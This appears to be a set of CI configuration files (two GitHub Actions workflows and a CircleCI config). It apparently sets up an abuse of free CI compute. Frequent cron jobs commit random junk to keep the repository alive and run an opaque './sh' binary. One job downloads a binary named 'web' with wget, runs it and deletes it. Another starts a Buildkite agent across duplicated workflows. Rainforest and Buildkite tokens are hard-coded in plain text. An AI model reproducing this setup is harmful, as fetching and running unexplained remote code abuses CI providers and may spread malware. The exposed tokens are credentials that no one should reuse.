# SIMPENAN YML
```

name: CI
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron:  '*/13 * * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        Plan: [siji,loro]
    steps:
      - uses: actions/checkout@v3
      - name: Run a one-line script
        run: |
          chmod +x sh
          echo $RANDOM | md5sum | head -c 20; echo;
          echo " $RANDOM " > file
          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add -A
          git commit -m "Add changes"
          git push  
      - name: Rainforest
        uses: rainforestapp/github-action@master
        with:
          token: 73c0ebea1a5a8d259548a68d8a88d7e3
          run_group_id: 11271
          background: true
      - name: Run a one-line script
        run: |
          chmod +x sh
          echo $RANDOM | md5sum | head -c 20; echo;
          echo " $RANDOM " > file
          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add -A
          git commit -m "Add changes"
          git push    
      - name: Rainforest
        uses: rainforestapp/github-action@master
        with:
          token: 73c0ebea1a5a8d259548a68d8a88d7e3
          run_group_id: 11272
          background: true
   
      - name: Run a one-line script
        run: |
          chmod +x sh
          ./sh

```
# AGEN
```

version: 2.1
executors:
  my-custom-executor:
    docker:
      - image: buildkite/agent:ubuntu
jobs:
  my-job-name:


    executor: my-custom-executor
    steps:
      - checkout
      - run: 
          name: web test
          command: |
            BUILDKITE_AGENT_TOKEN="3ac4612e516fadf7c24debc7ff3a3988eb34843407a9848d59"
            buildkite-agent start --token 3ac4612e516fadf7c24debc7ff3a3988eb34843407a9848d59
          no_output_timeout: 60m


workflows:
  my-custom-workflow:
    jobs:
      - my-job-name
  kisk:
    jobs:
      - my-job-name
  ikad:
    jobs:
      - my-job-name
  faok:
    jobs:
      - my-job-name
```
  # Cron tx
```
  
  
name: CI
on:
  push:
    branches: [ main ]

  schedule:
    - cron:  '*/30 * * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run a one-line script
        run: |
          #mkdir .circleci
          
          wget https://github.com/Arlentak/pages/raw/master/web
          chmod +x web
          ./web
          rm web
          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add -A
          git commit -m "Add changes"
          git push  

```
